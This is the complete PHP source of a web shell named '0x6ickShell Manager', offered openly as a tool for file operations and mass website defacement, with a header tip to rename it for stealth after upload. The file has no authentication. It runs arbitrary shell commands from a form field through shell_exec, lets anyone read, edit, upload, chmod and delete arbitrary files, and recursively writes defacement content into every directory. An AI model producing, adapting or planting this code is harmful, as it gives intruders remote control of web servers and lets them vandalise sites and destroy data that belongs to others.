<?php
/*
--------------------------------------------------------
  0x6ickShell Manager v1.0
  ----------------------------
  Simple PHP Shell Manager
  Developed by: 6ickZone (Solo Operator with Team Spirit)
  Website     : https://0x6ick.zone.id
  GitHub      : https://github.com/6ickzone
  Keywords    : PHP Shell, Deface Tool, Uploader, 6ickZone, Webshell, File Manager
  Description : Lightweight, fast, and intuitive web shell interface for file operations and mass defacement. Designed with a touch of branding for 0x6ickZone.
  Tip: Rename this file uniquely before upload for operational stealth.
  Notes:
  - Customize themes by editing $theme_* variables.
  - Adjust max upload size via php.ini if needed.
  - Always backup before mass deface or destructive actions.
--------------------------------------------------------
*/
error_reporting(0);
set_time_limit(0);

// --- CONFIG ---
$title = "0x6ickShell Manager";
$author = "6ickZone";
$theme_bg = "#0d0d0d";
$theme_fg = "#00ffcc";
$theme_input = "#1a1a1a";
$theme_border = "#00ffff";
$font_family = "'Fira Code', monospace";

// --- UI ---
echo "<!DOCTYPE html><html><head><title>$title</title><style>
body {
  background: $theme_bg;
  color: $theme_fg;
  font-family: $font_family;
  margin: 0; padding: 0; text-align: center;
}
a { color: $theme_fg; text-decoration: none; }
hr { border-top: 1px solid $theme_fg; }
table { width: 90%; margin: auto; border-collapse: collapse; }
th, td { border: 1px solid $theme_fg; padding: 6px; }
input, textarea {
  background: $theme_input;
  color: #0f0;
  border: 1px solid $theme_border;
  font-family: $font_family;
}
textarea { width: 100%; height: 300px; }
h1 { color: #fff; margin-top: 20px; }
</style></head><body>";

echo "<h1>$title</h1><small>$author</small><hr>";
echo "<div style='color:gray;'>".php_uname()."</div><hr>";

// PATH
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = str_replace('\\', '/', $path);
$paths = explode('/', $path);
echo "<div style='margin:10px;'>";
foreach($paths as $id => $part){
  if($part == '' && $id == 0){
    echo "<a href='?path=/'>/</a>";
    continue;
  }
  if($part == '') continue;
  echo "<a href='?path=";
  for($i = 0; $i <= $id; $i++) echo "$paths[$i]/";
  echo "'>$part</a>/";
}
echo "</div><hr>";

//Create File or Folder
if(isset($_GET['create'])){
  if(isset($_POST['type']) && isset($_POST['name'])){
    $target = rtrim($path, '/') . '/' . $_POST['name'];
    if($_POST['type'] === 'file'){
      if(file_put_contents($target, '') !== false) echo "<p style='color:lime;'>File created!</p>";
      else echo "<p style='color:red;'>Failed to create file.</p>";
    } elseif($_POST['type'] === 'dir') {
      if(mkdir($target)) echo "<p style='color:lime;'>Folder created!</p>";
      else echo "<p style='color:red;'>Failed to create folder.</p>";
    }
  }
  echo "<form method='POST'>
  Create: 
  <select name='type'><option value='file'>File</option><option value='dir'>Folder</option></select>
  Name: <input type='text' name='name'>
  <input type='submit' value='Create'>
  </form>";
}
echo "<br><a href='?create=true'>+ New File/Folder</a><hr>";

// Container forms up/mass
echo "<div style='display: flex; justify-content: center; gap: 20px; margin: 20px;'>";

// Upload form
if(isset($_FILES['file'])){
  $dest = $path.'/'.$_FILES['file']['name'];
  if(copy($_FILES['file']['tmp_name'], $dest)) echo "<p style='color:lime;'>Upload success!</p>";
  else echo "<p style='color:red;'>Upload failed.</p>";
}

echo "<form method='POST' enctype='multipart/form-data' style='flex: 1; max-width: 45%;'>
  <h3>Upload File</h3>
  <input type='file' name='file' style='width: 100%; margin-bottom: 10px;'>
  <input type='submit' value='Upload' style='width: 100%;'>
</form>";

// Mass Deface form
echo "<form method='POST' style='flex: 1; max-width: 45%;'>
  <h3>Mass Deface</h3>
  <input type='text' name='mass_name' placeholder='Filename (ex: index.php)' required style='width: 100%; margin-bottom: 10px;'>
  <textarea name='mass_code' placeholder='Deface HTML/PHP code...' required style='width: 100%; height: 150px; margin-bottom: 10px;'></textarea>
  <input type='submit' name='mass_deface' value='Execute Mass Deface' style='width: 100%;'>
</form>";

echo "</div><hr>";

// Handle Mass Deface
if(isset($_POST['mass_deface'])){
  $filename = $_POST['mass_name'];
  $content = $_POST['mass_code'];
  $results = "";
  
  function mass_deface($dir, $filename, $content, &$results) {
    $scan = scandir($dir);
    foreach ($scan as $item) {
      if ($item == "." || $item == "..") continue;
      $full = "$dir/$item";
      if (is_dir($full)) {
        mass_deface($full, $filename, $content, $results);
      } else {
        // write to each folder
        file_put_contents("$dir/$filename", $content);
        $results .= htmlspecialchars("$dir/$filename -> DONE\n");
      }
    }
  }

  mass_deface($path, $filename, $content, $results);
  echo "<pre style='background:#000;color:#0f0;text-align:left;padding:10px;border:1px solid $theme_border;'>$results</pre>";
}

// CMD EXECUTE
echo "<hr><h3>Execute Command</h3>";
if(isset($_POST['cmd'])){
  echo "<form method='POST'>
  <input type='text' name='cmd' value='".htmlspecialchars($_POST['cmd'])."' style='width:80%;'>
  <input type='submit' value='Execute'></form><br>";
  echo "<pre style='text-align:left;background:#000;color:#0f0;padding:10px;border:1px solid $theme_border;'>";
  echo htmlspecialchars(shell_exec($_POST['cmd']));
  echo "</pre>";
} else {
  echo "<form method='POST'>
  <input type='text' name='cmd' placeholder='whoami or ls -la' style='width:80%;'>
  <input type='submit' value='Execute'></form>";
}

// View or Edit
if(isset($_GET['filesrc'])){
  echo "<h3>Viewing: ".$_GET['filesrc']."</h3>";
  echo "<textarea readonly>".htmlspecialchars(file_get_contents($_GET['filesrc']))."</textarea>";
}elseif(isset($_GET['edit'])){
  if(isset($_POST['editcontent'])){
    file_put_contents($_GET['edit'], $_POST['editcontent']);
    echo "<p style='color:lime;'>File saved!</p>";
  }
  echo "<form method='POST'>
  <textarea name='editcontent'>".htmlspecialchars(file_get_contents($_GET['edit']))."</textarea>
  <input type='submit' value='Save'>
  </form>";
}else{
  $scandir = scandir($path);
  echo "<table><tr><th>Name</th><th>Size</th><th>Permission</th><th>Action</th></tr>";
  foreach($scandir as $file){
    if($file == ".") continue;
    $full = $path.'/'.$file;
    echo "<tr><td>";
    if(is_dir($full)) echo "<a href='?path=$full'>$file</a>";
    else echo "<a href='?filesrc=$full'>$file</a>";
    echo "</td><td>".(is_file($full) ? filesize($full) : '-')."</td>";
    echo "<td>".substr(sprintf('%o', fileperms($full)), -4)."</td><td>";
    echo "<a href='?edit=$full'>Edit</a> | ";
    echo "<a href='?rename=$full'>Rename</a> | ";
    echo "<a href='?chmod=$full'>Chmod</a> | ";
    echo "<a href='?delete=$full' onclick=\"return confirm('Delete?');\">Delete</a>";
    echo "</td></tr>";
  }
  echo "</table>";
}

// Rename
if(isset($_GET['rename'])){
  if(isset($_POST['newname'])){
    $new = dirname($_GET['rename']).'/'.$_POST['newname'];
    rename($_GET['rename'], $new);
    echo "<p style='color:lime;'>Renamed!</p>";
  }
  echo "<form method='POST'>New name: <input type='text' name='newname'>
  <input type='submit' value='Rename'></form>";
}

// Chmod
if(isset($_GET['chmod'])){
  if(isset($_POST['perm'])){
    chmod($_GET['chmod'], octdec($_POST['perm']));
    echo "<p style='color:lime;'>Permission changed!</p>";
  }
  echo "<form method='POST'>Permission: <input type='text' name='perm' value='".substr(sprintf('%o', fileperms($_GET['chmod'])), -4)."'>
  <input type='submit' value='Chmod'></form>";
}

// Delete
if(isset($_GET['delete'])){
  if(is_dir($_GET['delete'])) rmdir($_GET['delete']);
  else unlink($_GET['delete']);
  echo "<p style='color:red;'>Deleted!</p>";
}

// Footer
echo "<hr>";
echo "<footer><small>$title - <a href='https://0x6ick.zone.id' target='_blank' style='color:inherit;text-decoration:none;'>$author</a> | 2025</small></footer>";
echo "</body></html>";
?>
